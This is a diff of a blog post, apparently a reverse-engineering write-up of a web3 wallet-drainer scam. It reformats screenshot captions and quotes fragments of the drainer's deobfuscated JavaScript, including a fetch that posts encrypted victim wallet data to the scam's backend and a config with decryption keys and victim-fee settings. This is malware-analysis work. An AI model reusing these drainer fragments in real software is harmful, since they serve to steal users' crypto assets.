@@ -634,14 +634,50 @@ mjx-container[display="true"] + br {
 
 <p><code>_0x1b9465</code> is from the <code>_0x1a0343</code> function. <code>_0x1a0343</code> encrypts  data like <code>customer_id</code>, the victim’s wallet address, and the website’s URL.<br>Note that it uses the key <code>inferno</code>, so it was probably developed by Inferno. (Sunsec told me it was perhaps from Inferno while I presented the research to him.)</p>
 <p>Let’s return to the <code>fetch</code> part of the code.</p>
-<h6 id="The-0x1a0343-function-after-deobfuscation"><a href="#The-0x1a0343-function-after-deobfuscation" class="headerlink" title="The _0x1a0343 function after deobfuscation"></a>The <code>_0x1a0343</code> function after deobfuscation</h6><p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1b9465-deobfscated.webp" alt="_0x1b9465"><br>…<br><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1b9465-deobfscated-2.webp" alt="_0x1b9465-deobfscated-2"></p>
-<h6 id="The-0x1a0343-function-before-deobfuscation"><a href="#The-0x1a0343-function-before-deobfuscation" class="headerlink" title="The _0x1a0343 function before deobfuscation"></a>The <code>_0x1a0343</code> function before deobfuscation</h6><p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1b9465.webp" alt="_0x1b9465"></p>
+<table>
+<thead>
+<tr>
+<th align="center"><em>The <code>_0x1a0343</code> function after deobfuscation</em></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1b9465-deobfscated.webp" alt="_0x1b9465">…<img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1b9465-deobfscated-2.webp" alt="_0x1b9465-deobfscated-2"></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center"><em>The <code>_0x1a0343</code> function before deobfuscation</em></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1b9465.webp" alt="_0x1b9465"></td>
+</tr>
+</tbody></table>
 <p>After fetching the API, it is called <code>_0x6899a5</code> with the returned data. Let us investigate it.</p>
 <div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> _0xb21bb0 = <span class="keyword">await</span> <span class="title function_">fetch</span>(_0x14e175[<span class="string">'api'</span>] + <span class="string">'/ethereum'</span>, {</span><br><span class="line">    <span class="string">'method'</span>: <span class="string">'POST'</span>,</span><br><span class="line">    <span class="string">'body'</span>: _0x1b9465</span><br><span class="line">});</span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_0x6899a5</span>(<span class="keyword">await</span> _0xb21bb0[<span class="string">'text'</span>]())</span><br><span class="line">} <span class="keyword">catch</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
 
 <p><code>_0x6899a5</code> decrypts the data and returns it. Let us investigate the decryption key.</p>
-<h6 id="Deobfuscated-0x6899a5"><a href="#Deobfuscated-0x6899a5" class="headerlink" title="Deobfuscated _0x6899a5"></a>Deobfuscated <code>_0x6899a5</code></h6><p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x6899a5-deobfscated.webp" alt="_0x6899a5-deobfscated"></p>
-<h6 id="The-original-0x6899a5"><a href="#The-original-0x6899a5" class="headerlink" title="The original _0x6899a5"></a>The original <code>_0x6899a5</code></h6><p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x6899a5.webp" alt="_0x6899a5"></p>
+<table>
+<thead>
+<tr>
+<th align="center"><em>Deobfuscated <code>_0x6899a5</code></em></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x6899a5-deobfscated.webp" alt="_0x6899a5-deobfscated"></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center"><em>The original <code>_0x6899a5</code></em></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x6899a5.webp" alt="_0x6899a5"></td>
+</tr>
+</tbody></table>
 <p>The decryption key is from <code>_0x97a49a</code>. Let’s look into it.</p>
 <div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="comment">/* ... */</span>, <span class="attr">BACKEND_DECRYPT_KEY</span>: _0x3c024e} = <span class="title function_">_0x97a49a</span>()</span><br></pre></td></tr></table></figure></div>
 
@@ -649,15 +685,58 @@ mjx-container[display="true"] + br {
 <h6 id="The-0x97a49a-return-data"><a href="#The-0x97a49a-return-data" class="headerlink" title="The _0x97a49a() return data"></a>The <code>_0x97a49a()</code> return data</h6><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">    <span class="string">"UNIQUE_VERSION"</span>: <span class="string">"6.8.003"</span>,</span><br><span class="line">    <span class="string">"DEBUG_WALLET"</span>: <span class="literal">false</span>, <span class="comment">/* ... */</span></span><br><span class="line">    <span class="string">"BLUR_FEE_TYPEHASH"</span>: <span class="string">"0x05b43f730f67de334a342883f867101fc7ef3361dfdff4a29a7aa97e0920ef7a"</span>,</span><br><span class="line">    <span class="string">"BLUR_ORDER_TYPEHASH"</span>: <span class="string">"0x376bfbc394a7ba7fdf10f224572cef371358e3053e362f4554fcd2ad56329b3f"</span>,</span><br><span class="line">    <span class="string">"LOCAL_STORAGE_KEY_NAME"</span>: <span class="string">"8gzjkjluo2"</span>,</span><br><span class="line">    <span class="string">"LOCAL_STORAGE_ENCRYPT_KEY"</span>: <span class="string">"xi3z2y8ne3f34yxkbhci8cah8y9ic6q5xkctpfpzg4vvi7b8mmn22brdiee5fbrwdvhhzwi9qfquzktpip9kvvaiyirzfk3gh45p"</span>,</span><br><span class="line">    <span class="string">"BACKEND_DECRYPT_KEY"</span>: <span class="string">"r8hhweybk9ekz62w45qvyjnpz3xguueqg6amhbbghbckpeu8fmzdiivezfbnfxe9puz4thkpx5ejcipp53pcuydpu4yuyxx4rqqu"</span>,</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    <span class="string">"METHODS_REQUIERING_VICTIM_TO_PAY_FEES"</span>: [ <span class="comment">/* ... */</span> ],</span><br><span class="line">    <span class="string">"DAPP_CONNECT_URL"</span>: <span class="string">"l.ching367436.me:5501"</span>,</span><br><span class="line">    <span class="string">"IS_VICTIM_ON_MOBILE"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"OS"</span>: <span class="string">"Windows"</span>,</span><br><span class="line">    <span class="string">"MAX_OPENSEA_ELEMENTS"</span>: <span class="number">15</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
 
 <p>The function _0x1e89b9 uses the API return data _0x2612b1. If _0x2612b1[‘blacklisted’], the program will exit. It’s important to note that the API has knowledge of the victim’s address and URL, so the website might blacklist the localhost URL or wallet address belonging to security researchers for security reasons. The drainer address is also specified by the API.</p>
-<h6 id="The-deobfuscated-0x1e89b9"><a href="#The-deobfuscated-0x1e89b9" class="headerlink" title="The deobfuscated _0x1e89b9"></a>The deobfuscated <code>_0x1e89b9</code></h6><p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1e89b9-deobfuscated.webp" alt="_0x1e89b9-deobfuscated"></p>
-<p>…</p>
-<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1e89b9-deobfuscated-2.webp" alt="_0x1e89b9-deobfuscated-2"></p>
-<h6 id="The-original-0x1e89b9"><a href="#The-original-0x1e89b9" class="headerlink" title="The original _0x1e89b9"></a>The original <code>_0x1e89b9</code></h6><p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1e89b9.webp" alt="_0x1e89b9"></p>
+<table>
+<thead>
+<tr>
+<th align="center"><em>The deobfuscated <code>_0x1e89b9</code></em></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1e89b9-deobfuscated.webp" alt="_0x1e89b9-deobfuscated">…<img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1e89b9-deobfuscated-2.webp" alt="_0x1e89b9-deobfuscated-2"></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center"><em>The original <code>_0x1e89b9</code></em></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/0x1e89b9.webp" alt="_0x1e89b9"></td>
+</tr>
+</tbody></table>
 <h2 id="Automate-the-code-deobfuscation-process"><a href="#Automate-the-code-deobfuscation-process" class="headerlink" title="Automate the code deobfuscation process"></a>Automate the code deobfuscation process</h2><p>Manually deobfuscating the code is effective, but the user experience is bad. I attempted to use existing deobfuscation tools, but they were ineffective. Therefore, I decided to develop my own deobfuscator.</p>
 <p>The original code and the deobfuscation using the existing deobfuscator, as well as the deobfuscation using my deobfuscator, are shown below. Let us see how I achieved this.</p>
-<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/code-before-deobfuscation.webp" alt="code-before-deobfuscation"></p>
-<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/code-after-deobfuscation.webp" alt="code-after-deobfuscation"></p>
-<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/code-after-my-deobfuscation.webp" alt="code-after-my-deobfuscation"></p>
+<table>
+<thead>
+<tr>
+<th align="center"><em>The original code</em></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/code-before-deobfuscation.webp" alt="code-before-deobfuscation"></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center"><em>The code deobscated by a existing deobfuscator</em></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/code-after-deobfuscation.webp" alt="code-after-deobfuscation"></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center"><em>The code deobscated by my deobfuscator</em></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/code-after-my-deobfuscation.webp" alt="code-after-my-deobfuscation"></td>
+</tr>
+</tbody></table>
 <p>Let’s start by identifying the obfuscation in the code. There is a function called <code>__p_0566375197</code> that appears over twenty thousand times. Let us see what it does.</p>
 <p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/p_0566375197.webp" alt="p_0566375197"></p>
 <p>It checks if the value of <code>__p_5272508748[x]</code> is present. If it is, it returns the value. If not, it calculates it using <code>__p_6222965791(__p_7737682834[x]))</code> and fills in <code>__p_5272508748[x]</code>, then returns the value. What <code>__p_6222965791</code> does is perform calculations based on its argument. Therefore, we can replace all occurrences of <code>__p_0566375197(x)</code> with its value.</p>
@@ -909,7 +988,7 @@ mjx-container[display="true"] + br {
                     </span>
                     
                         <span>
-                            29.7k words in total
+                            29.8k words in total
                         </span>
                     
                 </p>
